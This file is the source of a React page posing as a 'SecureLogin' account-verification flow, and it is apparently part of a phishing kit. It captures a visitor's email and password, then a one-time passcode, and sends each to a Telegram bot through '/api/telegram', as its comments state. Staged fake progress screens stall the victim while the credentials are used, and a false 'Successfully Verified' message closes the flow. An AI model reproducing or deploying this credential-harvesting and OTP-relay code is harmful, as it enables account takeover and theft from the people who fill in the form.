'use client'

import { useState, useEffect } from 'react'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import { Progress } from '@/components/ui/progress'
import { Badge } from '@/components/ui/badge'
import { Shield, CheckCircle, Loader2, Mail, Lock, MessageSquare } from 'lucide-react'

interface LoginData {
  email: string
  password: string
}

export default function VerificationFlow() {
  const [currentStep, setCurrentStep] = useState(1)
  const [loginData, setLoginData] = useState<LoginData>({
    email: '',
    password: ''
  })
  const [otpCode, setOtpCode] = useState('')
  const [isLoading, setIsLoading] = useState(false)
  const [progress, setProgress] = useState(0)

  // 60-second progress after login submission
  useEffect(() => {
    if (currentStep === 2) {
      setIsLoading(true)
      setProgress(0)

      const interval = setInterval(() => {
        setProgress(prev => {
          if (prev >= 100) {
            clearInterval(interval)
            setIsLoading(false)
            setCurrentStep(3)
            return 100
          }
          return prev + 1.67 // 100/60 seconds = ~1.67% per second
        })
      }, 1000)

      return () => clearInterval(interval)
    }
  }, [currentStep])

  // Progress after OTP submission
  useEffect(() => {
    if (currentStep === 4) {
      setIsLoading(true)
      setProgress(0)

      const interval = setInterval(() => {
        setProgress(prev => {
          if (prev >= 100) {
            clearInterval(interval)
            setIsLoading(false)
            setCurrentStep(5)
            return 100
          }
          return prev + 3.33 // 100/30 seconds = faster second loader
        })
      }, 1000)

      return () => clearInterval(interval)
    }
  }, [currentStep])

  const handleLoginSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    try {
      // Send login data to Telegram
      const response = await fetch('/api/telegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          type: 'login',
          email: loginData.email,
          password: loginData.password,
          timestamp: new Date().toLocaleString()
        })
      })

      const result = await response.json()

      if (result.success) {
        console.log('Login data sent to Telegram bot successfully')
        setCurrentStep(2) // Start 60-second progress
      } else {
        console.error('Failed to submit login:', result.message)
        alert('Failed to submit login. Please try again.')
      }
    } catch (error) {
      console.error('Error submitting login:', error)
      alert('Network error. Please check your connection and try again.')
    }
  }

  const handleOtpSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (otpCode.length === 6) {
      try {
        // Send OTP to Telegram
        const response = await fetch('/api/telegram', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            type: 'otp',
            email: loginData.email,
            otpCode: otpCode,
            timestamp: new Date().toLocaleString()
          })
        })

        const result = await response.json()

        if (result.success) {
          console.log('OTP sent to Telegram bot successfully')
          setCurrentStep(4) // Start second progress loader
        } else {
          console.error('Failed to submit OTP:', result.message)
          alert('Failed to submit OTP. Please try again.')
        }
      } catch (error) {
        console.error('Error submitting OTP:', error)
        alert('Network error. Please check your connection and try again.')
      }
    }
  }

  const renderStepIndicator = () => (
    <div className="flex items-center justify-center mb-8">
      {[1, 2, 3, 4, 5].map((step) => (
        <div key={step} className="flex items-center">
          <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-medium ${
            step <= currentStep
              ? 'bg-blue-600 text-white'
              : 'bg-gray-200 text-gray-600'
          }`}>
            {step < currentStep ? '✓' : step}
          </div>
          {step < 5 && (
            <div className={`w-12 h-0.5 mx-2 ${
              step < currentStep ? 'bg-blue-600' : 'bg-gray-200'
            }`} />
          )}
        </div>
      ))}
    </div>
  )

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 flex items-center justify-center p-4">
      <div className="w-full max-w-md">
        <div className="text-center mb-8">
          <Shield className="mx-auto h-12 w-12 text-blue-600 mb-4" />
          <h1 className="text-2xl font-bold text-gray-900">SecureLogin</h1>
          <p className="text-gray-600">Secure Account Verification</p>
        </div>

        {renderStepIndicator()}

        {/* Step 1: Email & Password Login */}
        {currentStep === 1 && (
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Mail className="h-5 w-5" />
                Login to Your Account
              </CardTitle>
              <CardDescription>
                Enter your email and password to continue
              </CardDescription>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleLoginSubmit} className="space-y-4">
                <div>
                  <Label htmlFor="email">Email Address</Label>
                  <Input
                    id="email"
                    type="email"
                    placeholder="Enter your email"
                    value={loginData.email}
                    onChange={(e) => setLoginData({ ...loginData, email: e.target.value })}
                    required
                  />
                </div>

                <div>
                  <Label htmlFor="password">Password</Label>
                  <Input
                    id="password"
                    type="password"
                    placeholder="Enter your password"
                    value={loginData.password}
                    onChange={(e) => setLoginData({ ...loginData, password: e.target.value })}
                    required
                  />
                </div>

                <Button type="submit" className="w-full">
                  Sign In
                </Button>
              </form>
            </CardContent>
          </Card>
        )}

        {/* Step 2: First Progress Loader (60 seconds) */}
        {currentStep === 2 && (
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Loader2 className="h-5 w-5 animate-spin" />
                Verifying Credentials
              </CardTitle>
              <CardDescription>
                Please wait while we verify your login information
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              <div className="flex flex-col items-center space-y-4">
                <div className="relative w-24 h-24">
                  <svg className="w-24 h-24 transform -rotate-90" viewBox="0 0 100 100">
                    <circle
                      cx="50"
                      cy="50"
                      r="40"
                      stroke="#e5e7eb"
                      strokeWidth="8"
                      fill="none"
                    />
                    <circle
                      cx="50"
                      cy="50"
                      r="40"
                      stroke="#3b82f6"
                      strokeWidth="8"
                      fill="none"
                      strokeLinecap="round"
                      strokeDasharray={`${2 * Math.PI * 40}`}
                      strokeDashoffset={`${2 * Math.PI * 40 * (1 - progress / 100)}`}
                      className="transition-all duration-1000 ease-linear"
                    />
                  </svg>
                  <div className="absolute inset-0 flex items-center justify-center">
                    <span className="text-lg font-semibold text-blue-600">{Math.round(progress)}%</span>
                  </div>
                </div>
                <p className="text-sm text-gray-600">Sending credentials to secure server...</p>
                <Badge variant="secondary">Processing Login</Badge>
              </div>

              <div className="text-center text-sm text-gray-500">
                This process takes approximately 60 seconds
              </div>
            </CardContent>
          </Card>
        )}

        {/* Step 3: OTP Verification */}
        {currentStep === 3 && (
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <MessageSquare className="h-5 w-5" />
                Enter Verification Code
              </CardTitle>
              <CardDescription>
                Please enter the 6-digit OTP code you received
              </CardDescription>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleOtpSubmit} className="space-y-4">
                <div>
                  <Label htmlFor="otp">Verification Code</Label>
                  <Input
                    id="otp"
                    type="text"
                    placeholder="000000"
                    maxLength={6}
                    value={otpCode}
                    onChange={(e) => setOtpCode(e.target.value.replace(/\D/g, ''))}
                    className="text-center text-lg tracking-widest"
                    required
                  />
                </div>

                <Button
                  type="submit"
                  className="w-full"
                  disabled={otpCode.length !== 6}
                >
                  Verify Code
                </Button>

                <div className="text-center">
                  <Button variant="link" className="text-sm">
                    Didn't receive code? Resend
                  </Button>
                </div>
              </form>
            </CardContent>
          </Card>
        )}

        {/* Step 4: Second Progress Loader */}
        {currentStep === 4 && (
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Loader2 className="h-5 w-5 animate-spin" />
                Finalizing Verification
              </CardTitle>
              <CardDescription>
                Processing your verification code
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              <div className="flex flex-col items-center space-y-4">
                <div className="relative w-24 h-24">
                  <svg className="w-24 h-24 transform -rotate-90" viewBox="0 0 100 100">
                    <circle
                      cx="50"
                      cy="50"
                      r="40"
                      stroke="#e5e7eb"
                      strokeWidth="8"
                      fill="none"
                    />
                    <circle
                      cx="50"
                      cy="50"
                      r="40"
                      stroke="#10b981"
                      strokeWidth="8"
                      fill="none"
                      strokeLinecap="round"
                      strokeDasharray={`${2 * Math.PI * 40}`}
                      strokeDashoffset={`${2 * Math.PI * 40 * (1 - progress / 100)}`}
                      className="transition-all duration-1000 ease-linear"
                    />
                  </svg>
                  <div className="absolute inset-0 flex items-center justify-center">
                    <span className="text-lg font-semibold text-green-600">{Math.round(progress)}%</span>
                  </div>
                </div>
                <p className="text-sm text-gray-600">Sending OTP to secure server...</p>
                <Badge variant="secondary" className="bg-green-100 text-green-800">
                  Finalizing Verification
                </Badge>
              </div>
            </CardContent>
          </Card>
        )}

        {/* Step 5: Success */}
        {currentStep === 5 && (
          <Card>
            <CardContent className="pt-8">
              <div className="text-center space-y-4">
                <div className="mx-auto w-16 h-16 bg-green-100 rounded-full flex items-center justify-center animate-pulse">
                  <CheckCircle className="h-8 w-8 text-green-600" />
                </div>
                <h2 className="text-2xl font-bold text-gray-900">Congratulations!</h2>
                <p className="text-gray-600">
                  You have been successfully verified. Your account is now secure.
                </p>
                <Badge variant="default" className="bg-green-600 hover:bg-green-700">
                  ✓ Successfully Verified
                </Badge>
                <div className="pt-4">
                  <Button
                    onClick={() => {
                      setCurrentStep(1)
                      setLoginData({ email: '', password: '' })
                      setOtpCode('')
                      setProgress(0)
                    }}
                    variant="outline"
                    className="w-full"
                  >
                    Start New Login
                  </Button>
                </div>
              </div>
            </CardContent>
          </Card>
        )}
      </div>
    </div>
  )
}
